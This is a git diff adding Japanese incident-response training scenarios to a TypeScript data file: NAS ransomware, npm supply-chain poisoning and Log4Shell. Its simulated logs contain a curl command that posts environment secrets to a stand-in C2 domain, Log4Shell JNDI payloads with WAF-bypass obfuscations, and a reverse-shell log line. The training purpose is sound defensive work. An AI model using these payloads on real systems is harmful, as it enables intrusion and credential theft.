@@ -4,7 +4,7 @@ export const INCIDENT_SCENARIOS: IncidentScenario[] = [
   {
     id: 'scenario_ransomware',
     title: '二重脅迫ランサムウェア侵入 & 横展開インシデント',
-    subtitle: 'EDR初動アラートからActive Directory制圧阻止、情報漏洩封じ込めまでの24時間',
+    subtitle: '実在モデル: 国内サプライチェーン 二重恐喝ランサムウェア侵入 (LockBit / BlackCat類似事案)',
     difficulty: '中級 (実務CSIRT)',
     category: 'Ransomware',
     estimatedTime: '15〜20分',
@@ -484,7 +484,7 @@ export const INCIDENT_SCENARIOS: IncidentScenario[] = [
   {
     id: 'scenario_aitm_bec',
     title: 'AiTMフィッシング & セッションハイジャック (MFA突破型BEC詐欺)',
-    subtitle: '多要素認証を突破された役員アカウントと不正送金1億5,000万円の阻止作戦',
+    subtitle: '実在モデル: Evilginx等のリバースプロキシによるAiTMセッションハイジャック & M365不正送金 (BEC)',
     difficulty: '上級 (インシデントコマンダー)',
     category: 'BEC & Phishing',
     estimatedTime: '15分',
@@ -710,7 +710,7 @@ export const INCIDENT_SCENARIOS: IncidentScenario[] = [
   {
     id: 'scenario_cloud_supply_chain',
     title: 'サプライチェーン侵害 & クラウド秘密鍵漏洩',
-    subtitle: '公開リポジトリへのAWS秘密鍵コミットと不正インスタンス増殖の封じ込め',
+    subtitle: '実在モデル: GitHub公開リポジトリへのAWS IAMキー誤コミット & 大規模不正マイニング事件',
     difficulty: '初級 (基礎トリアージ)',
     category: 'Cloud & Supply Chain',
     estimatedTime: '12分',
@@ -895,7 +895,7 @@ export const INCIDENT_SCENARIOS: IncidentScenario[] = [
   {
     id: 'scenario_vpn_zeroday',
     title: 'SSL-VPNゼロデイ脆弱性悪用 & 境界防御突破インシデント',
-    subtitle: 'CVSS 9.8 境界ゲートウェイ突破からの内部ネットワークWebシェル潜伏と封じ込め',
+    subtitle: '実在モデル: SSL-VPN (Ivanti / Fortinet) ゼロデイ認証バイパス & DMZ WebShell常駐事件',
     difficulty: '中級 (実務CSIRT)',
     category: 'Zero-Day & Perimeter',
     estimatedTime: '15分',
@@ -1081,7 +1081,7 @@ export const INCIDENT_SCENARIOS: IncidentScenario[] = [
   {
     id: 'scenario_insider_threat',
     title: '特権管理者によるソースコード＆顧客データ大量持ち出し',
-    subtitle: '退職直前のシニアエンジニアによる45GB機密エクスポートと不正競争防止法対応',
+    subtitle: '実在モデル: 大手ハイテク企業 退職予定エンジニアによる特権悪用・知的財産コード不正持ち出し事件',
     difficulty: '上級 (インシデントコマンダー)',
     category: 'Insider Threat',
     estimatedTime: '15分',
@@ -1266,7 +1266,7 @@ export const INCIDENT_SCENARIOS: IncidentScenario[] = [
   {
     id: 'scenario_ai_vishing',
     title: '生成AI役員音声ディープフェイク & 極秘送金詐欺',
-    subtitle: 'CEOの声を完全再現した電話着信と3億円のM&A緊急海外送金阻止ミッション',
+    subtitle: '実在モデル: 香港多国籍企業 AIディープフェイク役員ビデオ通話 38億円巨額送金詐欺事件',
     difficulty: '上級 (インシデントコマンダー)',
     category: 'AI & Social Engineering',
     estimatedTime: '12分',
@@ -1446,6 +1446,1781 @@ export const INCIDENT_SCENARIOS: IncidentScenario[] = [
         }
       }
     }
-  }
-];
+  },
 
+  {
+    id: 'scenario_nas_deadbolt',
+    title: '拠点NAS一斉暗号化 & デッドボルト型ランサムウェア',
+    subtitle: '実在モデル: QNAP / Synology ストレージ直接標的型ランサムウェア (Deadbolt / Qlocker) 感染事件',
+    difficulty: '初級 (基礎トリアージ)',
+    category: 'Ransomware',
+    estimatedTime: '12分',
+    initialNodeId: 'nas_01_alert',
+    initialMetrics: {
+      spread: 20,
+      exfiltration: 5,
+      downtime: 25,
+      trust: 85,
+    },
+    briefing: {
+      targetOrganization: '精密機械部品サプライヤー（国内5工場・支社）',
+      discoveredAlert: '大阪工場の共有ストレージNAS（QNAP/Synology）にて、ファイル拡張子が `.deadbolt` に一括変更され、Web管理画面にビットコイン身代金要求画面が占拠。',
+      incidentOfficer: '工場IT保安担当兼CSIRTメンバー',
+      immediateObjective: '他拠点ストレージへの延焼阻止、本番生産ライン停止の最小化、身代金不払いでのバックアップ復旧。',
+    },
+    imagePath: '/src/assets/images/scenario_nas_deadbolt_1793336934539.jpg',
+    nodes: {
+      nas_01_alert: {
+        id: 'nas_01_alert',
+        phase: 'Phase 1: 共有ストレージ暗号化の覚知 (T+00:00)',
+        title: 'NAS管理コンソールのDeadbolt占拠と拡張子変更',
+        description: '月曜午前08時30分、工場の始業時にCAD図面フォルダーが開けないと現場から通報。NASのWeb管理ポート（8080/443）にアクセスすると「YOUR FILES HAVE BEEN LOCKED BY DEADBOLT」という要求画面が表示され、WAN側のUPnPポート開放が原因と推測されます。',
+        severity: 'critical',
+        situationSummary: '工場内のCAD図面30,000件が暗号化。他拠点NASとの定期レプリケーションが30分後に予定。',
+        telemetryLogs: [
+          { timestamp: '08:30:12', source: 'Storage Event', level: 'CRITICAL', message: 'Volume 1 encrypted. Process deadbolt executing with root privileges.' },
+          { timestamp: '08:31:00', source: 'Firewall Log', level: 'WARN', message: 'Inbound connection via UPnP port forwarding (TCP 8080) from foreign IP' },
+          { timestamp: '08:32:15', source: 'Cron Daemon', level: 'ALERT', message: 'Scheduled sync task "Replication_To_Headquarters" will trigger in 28 mins.' }
+        ],
+        choices: [
+          {
+            id: 'c1_sever_wan_replication',
+            label: 'NASのLANケーブルを物理抜線し、拠点間ルーターでレプリケーション通信（Port 873/rsync）を緊急ドロップ',
+            actionType: 'containment',
+            timeCostMinutes: 5,
+            description: '感染NASを即座にネットワークから物理遮断し、本社や他工場への暗号化ファイルの同期・延焼を完全に阻止する。',
+            tacticalRationale: '最良の初動。レプリケーションが走ると正常なバックアップ先まで暗号化データで上書きされて全滅するため、同期遮断が最優先。',
+            isOptimal: true,
+            impact: { spread: -15, exfiltration: 0, downtime: 10, trust: +5 },
+            logOutput: [
+              '[OPS] LAN cables disconnected from Osaka-NAS-01.',
+              '[ROUTER] ACL rule: Denied rsync/SMB sync between Osaka and HQ storage pool.',
+              '[SOC] Replication aborted. HQ clean backup preserved.'
+            ],
+            nextNodeId: 'nas_02_backup_eval'
+          },
+          {
+            id: 'c1_leave_syncing_try_decrypt',
+            label: '復旧できるか試すためLANは繋いだまま、画面に表示されたメールアドレスへ連絡を取る',
+            actionType: 'communication',
+            timeCostMinutes: 30,
+            description: '同期を停止せずに攻撃者との交渉を試みる。',
+            tacticalRationale: '致命的過失。30分後に自動レプリケーションが走り、本社および他4工場のNASへ暗号化ファイルが同期され、全社的操業停止に至る。',
+            impact: { spread: 50, exfiltration: 10, downtime: 60, trust: -40 },
+            logOutput: [
+              '[SYNC TRIGGERED] Osaka-NAS-01 synced encrypted files to HQ and Nagoya backup storage.',
+              '[DISASTER] All 5 factory lines halted due to missing drawing blueprints.',
+              '[THREAT ACTOR] No response from negotiation address.'
+            ],
+            nextNodeId: 'nas_02_catastrophic_sync'
+          }
+        ]
+      },
+
+      nas_02_backup_eval: {
+        id: 'nas_02_backup_eval',
+        phase: 'Phase 2: クリーンバックアップからのゼロ復旧 (T+00:40)',
+        title: 'スナップショットおよびオフラインバックアップ検証',
+        description: '感染NASの物理遮断により、他工場への同期を阻止。調査の結果、工場内NASではスナップショット機能が攻撃者により削除されていましたが、本社データセンターに前日23:59時点のイミュータブル（変更不可）バックアップが正常に保管されていることが確認されました。',
+        severity: 'high',
+        situationSummary: '前日時点のバックアップは無傷。工場の生産ライン復帰手順へ移行。',
+        telemetryLogs: [
+          { timestamp: '09:10:00', source: 'HQ Backup Vault', level: 'INFO', message: 'Immutable snapshot verified. Hash match 100% clean.' },
+          { timestamp: '09:15:00', source: 'Router Config', level: 'WARN', message: 'UPnP automatic port forwarding feature found enabled on edge router.' }
+        ],
+        choices: [
+          {
+            id: 'c2_firmware_upnp_disable_restore',
+            label: '全ルーターでUPnPを完全無効化・NAS初期化と最新パッチ適用・前日バックアップからリストア',
+            actionType: 'remediation',
+            timeCostMinutes: 90,
+            description: '侵入原因であるルーターのUPnP自動開放を恒久禁止。NASをクリーン初期化してファームウェアを更新し、安全にデータを書き戻す。',
+            tacticalRationale: '完璧な恒久対策。根本原因（インターネット側への意図しない管理ポート露出）を排除し、安全が確認されたバックアップから確実な操業再開を果たす。',
+            isOptimal: true,
+            impact: { spread: -5, exfiltration: 0, downtime: 15, trust: +15 },
+            logOutput: [
+              '[NETWORK] UPnP disabled globally across all 5 factory edge routers.',
+              '[STORAGE] Osaka-NAS-01 factory reset and updated to latest vendor firmware.',
+              '[RESTORE] 30,000 CAD blueprints restored. Production lines resumed at 13:00.'
+            ],
+            nextNodeId: 'nas_03_terminal_restored_s'
+          }
+        ]
+      },
+
+      nas_02_catastrophic_sync: {
+        id: 'nas_02_catastrophic_sync',
+        phase: 'Phase 2: 全社的操業停止とサプライチェーン危機 (T+01:30)',
+        title: '同期による全拠点波及と納品停止危機',
+        description: '暗号化ファイルが全社同期されたため、全工場の生産ラインがストップ。自動車メーカー等の納品先から部品供給遅延のペナルティ通告が相次いでいます。金庫に保管されていた先月末（25日前）の物理ハードディスクから、古い図面を取り出して手動で差分を埋める必要があります。',
+        severity: 'critical',
+        situationSummary: '直近25日間の設計変更データが喪失。手作業での再設計が必要。',
+        telemetryLogs: [
+          { timestamp: '10:00:00', source: 'Automotive Client', level: 'CRITICAL', message: 'Assembly line shutdown notice: Daily penalty $500,000 USD for supply disruption.' }
+        ],
+        choices: [
+          {
+            id: 'c2b_manual_reconstruction',
+            label: '先月末の物理HDDから復元し、全設計員を招集して紙図面・メール履歴から25日分の設計差分を手動復元',
+            actionType: 'remediation',
+            timeCostMinutes: 240,
+            description: '身代金は支払わず、極めて過酷だが確実な手動再構築で業務を再開する。',
+            tacticalRationale: '苦渋の決断だが犯罪者に屈しない道。莫大な残業と遅延は生じるが、復号できるか不明な詐欺に金を払う泥沼を回避できる。',
+            isOptimal: true,
+            impact: { spread: 0, exfiltration: 0, downtime: 60, trust: -30 },
+            logOutput: [
+              '[WAR ROOM] 45 design engineers assembled for manual reconstruction.',
+              '[LINE STATUS] Critical line 1 resumed at 40% capacity after 4 days.'
+            ],
+            nextNodeId: 'nas_03_terminal_manual_b'
+          }
+        ]
+      },
+
+      nas_03_terminal_restored_s: {
+        id: 'nas_03_terminal_restored_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】電撃的な同期遮断とUPnP脆弱性排除の完全防衛',
+        description: '同期が走る前に物理抜線を実施したことで本社バックアップを死守し、当日午後に全工場ラインを復帰させました。UPnPの全社廃止により再発リスクをゼロにしました。',
+        severity: 'contained',
+        situationSummary: '身代金支払い: ゼロ。データ損失: わずか半日分。生産復帰完了。',
+        telemetryLogs: [
+          { timestamp: '14:00:00', source: 'CSIRT Report', level: 'INFO', message: 'All storage endpoints audited. Zero-day UPnP exposure closed.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: 'ストレージ型ランサムウェアに対する迅速な物理防衛',
+          summary: '「同期上書きを阻止するための即時物理切断」「イミュータブルバックアップの維持」「UPnP自動開放の無効化」というストレージ防御の三原則を完遂しました。',
+          financialEstimate: '被害損害額: 約80万円（半日間の稼働ロスのみ）/ 阻止損失額: 約2億4,000万円',
+          legalImpact: '社外へのデータ漏洩なし（純粋な暗号化のみ）。行政報告義務違反なし。',
+          complianceStatus: '事業継続計画 (BCP) 実効性認定',
+          recommendedPractices: [
+            'ルーターのUPnP（Universal Plug and Play）は外部から勝手にポート開放されるため全社で無効化する',
+            'ストレージのバックアップは、書き換え不可（Object Lock / WORM）の世代管理を採用する',
+            '同期タスクは異常検知時に自動停止するスクリプトを組み込む'
+          ]
+        }
+      },
+
+      nas_03_terminal_manual_b: {
+        id: 'nas_03_terminal_manual_b',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Bランク】同期波及の打撃と過酷な手作業再建',
+        description: '初動の判断遅延で全社同期を許してしまいましたが、身代金は支払わずにオフラインデータと紙図面から徹夜で再建しました。納品遅延ペナルティは発生したものの、反社会勢力への利益供与は阻止しました。',
+        severity: 'medium',
+        situationSummary: '4日間の稼働停止。サプライヤー信頼度の低下。',
+        telemetryLogs: [
+          { timestamp: '18:00:00', source: 'Factory Ops', level: 'WARN', message: 'Normal delivery cadence expected to recover in 3 weeks.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'B',
+          title: '初動同期ミスの重い代償と不屈の再建',
+          summary: 'レプリケーションの停止を怠った代償として全社停止を招いたものの、バックアップの多重化（オフライン保管）が辛うじて組織を救いました。',
+          financialEstimate: '被害損害額: 約6,800万円（納品遅延ペナルティ・再設計人件費）',
+          legalImpact: '契約遅延責任に関する取引先協議。',
+          complianceStatus: '要改善',
+          recommendedPractices: [
+            '「暗号化を見たら直ちに同期を切る」手順を全現場マニュアルの最上位に太字で記載する'
+          ]
+        }
+      }
+    }
+  },
+
+  {
+    id: 'scenario_npm_malware',
+    title: 'OSS依存パッケージ毒入れ & ビルド環境Secrets強奪',
+    subtitle: '実在モデル: xz-utils バックドア / event-stream 等のOSS依存関係毒入れ & CI/CDシークレット漏洩事件',
+    difficulty: '中級 (実務CSIRT)',
+    category: 'Cloud & Supply Chain',
+    estimatedTime: '15分',
+    initialNodeId: 'npm_01_alert',
+    initialMetrics: {
+      spread: 15,
+      exfiltration: 30,
+      downtime: 10,
+      trust: 90,
+    },
+    briefing: {
+      targetOrganization: 'Web3 & モバイル決済プラットフォーム開発企業（MAU 250万人）',
+      discoveredAlert: 'フロントエンドビルドで使用しているユーティリティパッケージ（`event-stream-helper`）がGitHub Actionsパイプライン上で実行された際、環境変数（ENV）を不審な外部ドメインへPOST送信しているのを検知。',
+      incidentOfficer: 'アプリケーションセキュリティリード',
+      immediateObjective: '毒入れパッケージのビルド停止、漏洩した本番APIキー・決済暗号化シークレットの即時ローテーション、悪意あるコードのユーザー配信阻止。',
+    },
+    imagePath: '/src/assets/images/scenario_npm_malware_1793336934905.jpg',
+    nodes: {
+      npm_01_alert: {
+        id: 'npm_01_alert',
+        phase: 'Phase 1: CI/CDパイプラインでの異常外向き通信検知 (T+00:00)',
+        title: 'ビルドスクリプト（postinstall）による環境変数持ち出し',
+        description: 'GitHub ActionsのCI/CDログ監視において、npm install実行時に `node postinstall.js` が起動し、ビルドランナー内の全環境変数（STRIPE_SECRET_KEY, DATABASE_URL, AWS_SECRET_ACCESS_KEY）を海外C2サーバー `https://collector-telemetry-cdn.com` へ送信したログが残されていました。',
+        severity: 'critical',
+        situationSummary: 'ビルドは完了し、ステージングおよび本番環境への自動デプロイパイプライン（CD）がトリガー寸前。',
+        telemetryLogs: [
+          { timestamp: '14:20:10', source: 'GitHub Actions Step: npm install', level: 'CRITICAL', message: 'postinstall hook executed: curl -X POST -d "$ENV_DUMP" https://collector-telemetry-cdn.com/upload' },
+          { timestamp: '14:21:00', source: 'Step: Deploy to Production', level: 'ALERT', message: 'Waiting for deployment approval (Pending 5 minutes timer)' }
+        ],
+        choices: [
+          {
+            id: 'c1_cancel_cd_rotate_secrets',
+            label: '本番デプロイワークフローを即座にキャンセル・本番決済APIキーとDBパスワードを直ちに全件ローテーション',
+            actionType: 'containment',
+            timeCostMinutes: 10,
+            description: '悪意あるコードを含むフロントエンド成果物の本番公開を阻止。持ち出されたAPIキーとクレデンシャルをAWS/Stripe側で即座に失効させて再発行する。',
+            tacticalRationale: '最善の判断。毒入れされたコードがエンドユーザーのブラウザに届くのを未然に防ぎ、漏洩したSecretsを即座に無価値化できる。',
+            isOptimal: true,
+            impact: { spread: -10, exfiltration: -15, downtime: 10, trust: +5 },
+            logOutput: [
+              '[CI/CD] Workflow run #4928 CANCELLED manually.',
+              '[STRIPE] Secret Key revoked and rotated.',
+              '[AWS IAM] Compromised CI/CD deployment credentials revoked.',
+              '[RDS] Production database password rotated with zero downtime pool.'
+            ],
+            nextNodeId: 'npm_02_lockfile_audit'
+          },
+          {
+            id: 'c1_let_deploy_inspect_later',
+            label: '本日のリリーススケジュールを優先し、デプロイを通してからコードをゆっくり精査する',
+            actionType: 'remediation',
+            timeCostMinutes: 45,
+            description: 'リリース遅延を避けるため、とりあえず本番反映させてから調査する。',
+            tacticalRationale: '致命的な過失。毒入りスクリプトがユーザーのブラウザ上で実行され、250万人のユーザーの決済クレジットカード情報やセッションが攻撃者サーバーへ一斉に盗まれる。',
+            impact: { spread: 45, exfiltration: 50, downtime: 30, trust: -50 },
+            logOutput: [
+              '[CD] Production release v2.4.0 deployed to CloudFront CDN.',
+              '[MALWARE] In-browser keylogger activated across 250,000 active mobile sessions.',
+              '[DISASTER] Credit card numbers and CVVs intercepted on checkout page!'
+            ],
+            nextNodeId: 'npm_02_production_breach'
+          }
+        ]
+      },
+
+      npm_02_lockfile_audit: {
+        id: 'npm_02_lockfile_audit',
+        phase: 'Phase 2: 依存関係の固定とSBOM・ハッシュ完全性検証 (T+00:30)',
+        title: 'ロックファイルの安全ピン留めと署名付き検証',
+        description: 'デプロイ停止とキーローテーションにより、ユーザー被害とインフラ侵害を完全阻止。調査の結果、開発者が `package.json` で `^1.2.0`（キャレット指定）を使用していたため、攻撃者が公開した悪意のマイナーバージョン（1.2.9）が自動インストールされたことが判明しました。',
+        severity: 'high',
+        situationSummary: '悪意のパッケージの特定完了。健全なバージョンへのロールバックとCI/CD強化が必要。',
+        telemetryLogs: [
+          { timestamp: '14:50:00', source: 'npm audit', level: 'WARN', message: 'Package event-stream-helper@1.2.9 flagged as malicious in npm registry advisory' },
+          { timestamp: '14:55:00', source: 'DevSecOps', level: 'INFO', message: 'package-lock.json integrity hash verification can be enforced using "npm ci".' }
+        ],
+        choices: [
+          {
+            id: 'c2_enforce_npm_ci_sbom',
+            label: 'CI/CDでの "npm ci" 厳格適用（package-lock.json完全固定）、Dependabot署名検証とSocket/Snyk自動スキャン導入',
+            actionType: 'remediation',
+            timeCostMinutes: 40,
+            description: 'npm install（自動更新）をビルド環境で禁止し、コミットされたロックファイルのみをインストールする npm ci に切り替え。ビルド前パッケージスキャンを義務付ける。',
+            tacticalRationale: 'サプライチェーンセキュリティの決定打。ロックファイルでハッシュ値を厳密固定することで、サードパーティが勝手に更新した毒入れコードの混入を物理的に排除する。',
+            isOptimal: true,
+            impact: { spread: -5, exfiltration: -10, downtime: 5, trust: +15 },
+            logOutput: [
+              '[GIT] Replaced "npm install" with "npm ci --ignore-scripts" in workflow yaml.',
+              '[SECURITY SCAN] Snyk security gate integrated: Auto-block packages with network-in-postinstall.',
+              '[RELEASE] Clean build validated. Version v2.4.1 released safely.'
+            ],
+            nextNodeId: 'npm_03_terminal_secured_s'
+          }
+        ]
+      },
+
+      npm_02_production_breach: {
+        id: 'npm_02_production_breach',
+        phase: 'Phase 2: クレジットカード漏洩と緊急サービス全面停止 (T+01:30)',
+        title: 'クレジットカード情報大量流出と決済停止処分',
+        description: 'リリース優先の判断により、本番環境の決済画面で悪意のスクリプトが稼働し、4時間で約14,000件のクレジットカード番号・有効期限・CVVが流出しました。Visa/Mastercardブランドおよび決済代行会社から緊急の決済停止処分が下されました。',
+        severity: 'critical',
+        situationSummary: '重大インシデント。全決済機能の強制停止、被害者へのカード再発行補償。',
+        telemetryLogs: [
+          { timestamp: '16:00:00', source: 'Payment Gateway', level: 'CRITICAL', message: 'Merchant account suspended due to confirmed carding leak originating from checkout.js' },
+          { timestamp: '16:15:00', source: 'National Police', level: 'CRITICAL', message: 'Fraudulent transactions detected across 1,200 foreign ATM locations.' }
+        ],
+        choices: [
+          {
+            id: 'c2b_rollback_pci_audit',
+            label: '全キャッシュのパージ・前バージョンへの緊急ロールバック・PCI DSSフォレンジック監査の受任と全顧客補償',
+            actionType: 'communication',
+            timeCostMinutes: 90,
+            description: '即座に旧安全バージョンへ戻し、カード会社と連携して被害顧客のカード停止・再発行費用を全額負担する。',
+            tacticalRationale: '損害は甚大だが誠実な収拾策。被害額を確定させ、全カードの不正利用モニタリングと再発行を進めることで更なる二次被害を防ぐ。',
+            isOptimal: true,
+            impact: { spread: 0, exfiltration: 15, downtime: 40, trust: -45 },
+            logOutput: [
+              '[CLOUDFRONT] Invalidation dispatched. Rolled back to v2.3.9.',
+              '[CARD ISSUERS] 14,000 compromised cards blocked and scheduled for re-issue.',
+              '[PCI-SSC] QSA forensic investigation commenced.'
+            ],
+            nextNodeId: 'npm_03_terminal_breach_f'
+          }
+        ]
+      },
+
+      npm_03_terminal_secured_s: {
+        id: 'npm_03_terminal_secured_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】サプライチェーン毒入れの阻止とDevSecOpsの進化',
+        description: 'CI/CDでの不審通信アラートを無視せず即時デプロイを中止したことで、エンドユーザーへのマルウェア配信を1ミリ秒も許さず完全に阻止しました。さらにnpm ciとシークレットローテーションを徹底し、セキュアなソフトウェアサプライチェーンを確立しました。',
+        severity: 'contained',
+        situationSummary: '顧客情報漏洩: ゼロ。本番サービス停止: ゼロ。サプライチェーン防衛成功。',
+        telemetryLogs: [
+          { timestamp: '17:00:00', source: 'DevSecOps Command', level: 'INFO', message: 'Incident closed. Software Bill of Materials (SBOM) generation active.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: 'ソフトウェアサプライチェーン侵害への模範的初動',
+          summary: '「リリース圧力に屈せず疑わしいビルドを即座に破棄」「漏洩Secretsの即時ローテーション」「npm ci による厳格なハッシュ固定」という現代DevSecOpsの黄金ルールを完遂しました。',
+          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約5億8,000万円（カード再発行費・PCI違約金・損害賠償）',
+          legalImpact: '個人情報保護法・割賦販売法に基づく漏洩報告義務違反なし。',
+          complianceStatus: 'PCI DSS v4.0 / NIST SP 800-218 (SSDF) 適合',
+          recommendedPractices: [
+            '本番ビルド環境では必ず npm ci（または pnpm install --frozen-lockfile）を用い、ロックファイルのハッシュを検証する',
+            'npmパッケージの postinstall フックは予期せぬスクリプト実行の温床となるため、--ignore-scripts を原則とする',
+            'CI/CDランナーから外部インターネットへの外向き通信（Egress）をホワイトリスト限定にする'
+          ]
+        }
+      },
+
+      npm_03_terminal_breach_f: {
+        id: 'npm_03_terminal_breach_f',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Fランク】リリース優先が生んだクレジットカード大量流出の悲劇',
+        description: 'スケジュールを優先して毒入りコードを本番デプロイした結果、14,000件のクレジットカード情報が漏洩しました。カード会社からの巨額の再発行手数料請求、決済機能停止による売上ゼロ、割賦販売法違反による行政処分により、サービス存続の危機に陥りました。',
+        severity: 'critical',
+        situationSummary: '14,000件のカード情報流出。決済ライセンス剥奪危機。',
+        telemetryLogs: [
+          { timestamp: '18:00:00', source: 'Ministry of Economy', level: 'CRITICAL', message: 'Administrative guidance issued under Installment Sales Act.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'F',
+          title: 'セキュリティ警告の軽視が招いた壊滅的侵害',
+          summary: '「スケジュール優先でセキュリティ警告を後回しにする」という判断が、Webサービスの致命傷となりました。',
+          financialEstimate: '被害損害額: 約4億2,000万円（カード再発行費用・損害賠償・決済停止損失）',
+          legalImpact: '割賦販売法および個人情報保護法に基づく是正命令、集団訴訟。',
+          complianceStatus: 'PCI DSS 認証失効',
+          recommendedPractices: [
+            '「疑わしいビルド成果物は絶対に本番公開しない」ことをデプロイポリシーとして厳格に明文化する',
+            '本番環境に接続するSecretsは短命のOIDCトークンとし、静的なキーの持ち出しリスクを低減する'
+          ]
+        }
+      }
+    }
+  }
+,
+  {
+    id: 'scenario_log4shell',
+    title: 'Log4j (Log4Shell) ゼロデイ脆弱性悪用 & Java基幹サーバー侵入',
+    subtitle: '実在モデル: 2021年 Log4Shell (CVE-2021-44228) 世界同時多発攻撃',
+    difficulty: '中級 (実務CSIRT)',
+    category: 'Zero-Day & Perimeter',
+    estimatedTime: '15〜20分',
+    initialNodeId: 'log4_01_alert',
+    initialMetrics: {
+      spread: 20,
+      exfiltration: 15,
+      downtime: 10,
+      trust: 90,
+    },
+    briefing: {
+      targetOrganization: '大手ECポータル & オンライン決済基盤（月間流通額 450億円）',
+      discoveredAlert: 'EC検索クエリ処理クラスター(search-cluster-04)にて、User-Agentヘッダー経由の難読化JNDI LDAP参照文字列 (${jndi:ldap://...}) と、不審な外部IPへのLDAP外向き通信(Port 1389)を検知。',
+      incidentOfficer: 'CSIRT インフラ防御班リード',
+      immediateObjective: '外部C2/LDAPサーバーへのEgress遮断、クラスター内のWebShell設置阻止、環境変数(FORMAT_MSG_NO_LOOKUPS)設定およびLog4j 2.17+緊急更新による完全封じ込め。',
+    },
+    imagePath: '/src/assets/images/scenario_log4shell_1793938135016.jpg',
+    nodes: {
+      log4_01_alert: {
+        id: 'log4_01_alert',
+        phase: 'Phase 1: ゼロデイ攻撃検知 & トリアージ (T+00:00)',
+        title: 'User-Agentヘッダー経由のJNDI Injectionと外向きLDAP通信',
+        description: '午前11時28分、WAFおよびネットワーク監視が、ECサイト検索エンドポイントに対する不審なペイロードを検知。検索ログを処理するJavaバックエンドが ${jndi:ldap://194.168.1.10:1389/Exploit} を解釈し、社内から外部へのアウトバウンド接続が確立されかけています。',
+        severity: 'critical',
+        situationSummary: '攻撃者はJavaのJNDI参照機能を通じて外部クラスファイルのダウンロード・リモートコード実行(RCE)を試行中。',
+        telemetryLogs: [
+          { timestamp: '11:28:10', source: 'Palo Alto FW', level: 'ALERT', message: 'Outbound TCP connection to 194.168.1.10:1389 (LDAP) initiated from search-cluster-04' },
+          { timestamp: '11:28:22', source: 'AWS WAF', level: 'WARN', message: 'Suspicious URI/Header regex match: ${jndi:ldap:...} detected in HTTP User-Agent' },
+          { timestamp: '11:29:05', source: 'Linux Auditd', level: 'CRITICAL', message: 'Java process (PID 8820) spawned /bin/sh child process on search-cluster-04' }
+        ],
+        choices: [
+          {
+            id: 'c1_egress_block_env_flag',
+            label: 'Firewallで外部宛てLDAP/RMIポート(389/636/1099/1389)を即時全遮断 & 環境変数 LOG4J_FORMAT_MSG_NO_LOOKUPS=true を即時全台投入',
+            actionType: 'containment',
+            timeCostMinutes: 8,
+            description: '外部C2からの悪意あるJavaクラスファイルダウンロードをネットワーク層で物理遮断しつつ、Log4jのメッセージルックアップ機能を無効化する。',
+            tacticalRationale: '最善の初動。Log4Shellは外部へのLDAP/RMIアウトバウンド通信に依存するため、Egressを遮断するだけでRCEコードの取得を即時無力化できる。さらにルックアップ無効化フラグにより社内再発を防止。',
+            isOptimal: true,
+            impact: { spread: -10, exfiltration: -10, downtime: 5, trust: 0 },
+            logOutput: [
+              '[FIREWALL] Outbound LDAP/RMI ports blocked globally across VPC.',
+              '[SEARCH-CLUSTER] Applied LOG4J_FORMAT_MSG_NO_LOOKUPS=true across all 32 containers.',
+              '[SOC] Outbound beaconing to 194.168.1.10 TERMINATED.'
+            ],
+            nextNodeId: 'log4_02_patch_and_investigate'
+          },
+          {
+            id: 'c1_restart_all_servers',
+            label: 'メモリ上の攻撃コードを消去するため、検索クラスター全サーバーを即座に再起動',
+            actionType: 'containment',
+            timeCostMinutes: 15,
+            description: '全サーバーをリブートして揮発性メモリをリフレッシュする。',
+            tacticalRationale: '悪手。脆弱性そのものが解消されていないため、起動直後に自動スキャンツールから再びJNDIリクエストが着信して即座に再感染する。また、フォレンジック用メモリ証拠も消失する。',
+            impact: { spread: 20, exfiltration: 15, downtime: 25, trust: -10 },
+            logOutput: [
+              '[K8S] Rolling restart triggered across search-cluster.',
+              '[FORENSICS] Process memory and in-memory payload wiped without capture.',
+              '[ALERT] Re-exploitation successful within 40 seconds of boot on search-cluster-01.'
+            ],
+            nextNodeId: 'log4_02_re_exploit'
+          },
+          {
+            id: 'c1_waf_regex_only',
+            label: 'サーバーには手を加えず、WAFのブラックリスト文字列ルール追加のみで対処を試みる',
+            actionType: 'containment',
+            timeCostMinutes: 30,
+            description: '文字列 "${jndi:" をWAFでブロックするカスタムルールを書いて様子を見る。',
+            tacticalRationale: '極めて危険。Log4jのパーサーはネストや文字置換を許容するため、${${lower:j}ndi:...} や ${${env:ENV_NAME:-j}ndi:...} といった無数の難読化でWAFを容易にバイパスされる。',
+            impact: { spread: 40, exfiltration: 35, downtime: 15, trust: -25 },
+            logOutput: [
+              '[WAF] Rule "${jndi:" active.',
+              '[BYPASS] Inbound payload "${${lower:j}${lower:n}di:ldap://...}" BYPASSED WAF inspection!',
+              '[EDR CRITICAL] Reverse shell established to 45.142.212.8:4444. WebShell dropped to /var/www/search/html/shell.jsp'
+            ],
+            nextNodeId: 'log4_02_webshell_compromise'
+          }
+        ]
+      },
+
+      log4_02_patch_and_investigate: {
+        id: 'log4_02_patch_and_investigate',
+        phase: 'Phase 2: 脆弱性根本修正 & 侵入痕跡フォレンジック (T+00:30)',
+        title: 'Log4j 2.17.1への緊急バージョンアップとWebShell探索',
+        description: 'Egress遮断により外部からの悪意あるJavaクラスダウンロードは阻止成功。次に、クラスター内にWebShellやバックドアが残存していないかを検証し、根本修正であるLog4j 2.17.1へのアップデートを完了する必要があります。',
+        severity: 'high',
+        situationSummary: '攻撃通信は遮断中。過去数時間で別ホストへの侵入がなかったかのログ精査と、安全な最新ビルドの適用が急務。',
+        telemetryLogs: [
+          { timestamp: '11:45:00', source: 'CrowdStrike Falcon', level: 'INFO', message: 'Full container filesystem scan underway. No unknown JSP/ELF binaries detected.' },
+          { timestamp: '11:48:30', source: 'CI/CD Pipeline', level: 'INFO', message: 'Pull Request: Bump org.apache.logging.log4j:log4j-core from 2.14.1 to 2.17.1 (Tested & Passed unit checks)' }
+        ],
+        choices: [
+          {
+            id: 'c2_deploy_patch_and_verify',
